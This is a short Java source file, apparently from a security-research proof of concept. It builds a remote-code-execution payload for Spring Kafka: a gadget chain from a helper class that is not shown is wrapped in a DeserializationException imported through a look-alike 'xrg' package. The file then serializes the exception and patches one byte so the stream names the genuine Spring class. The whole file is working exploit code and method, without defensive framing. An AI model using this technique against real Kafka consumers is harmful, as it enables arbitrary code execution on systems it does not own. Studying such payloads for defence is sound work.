package com.contrast;

import xrg.springframework.kafka.support.serializer.DeserializationException;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashSet;

public class PayloadHandler {
    public static byte[] getRCEPayload() throws Exception {
        byte[] exp = Test_CC.generate();
        DeserializationException exception = new DeserializationException(exp);
        byte[] data = serialize(exception);

        data[8] = "o".getBytes()[0];
        return data;
    }

    private static byte[] serialize(Object o) throws IOException {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(ba);
        oos.writeObject(o);
        oos.close();
        return ba.toByteArray();
    }
}
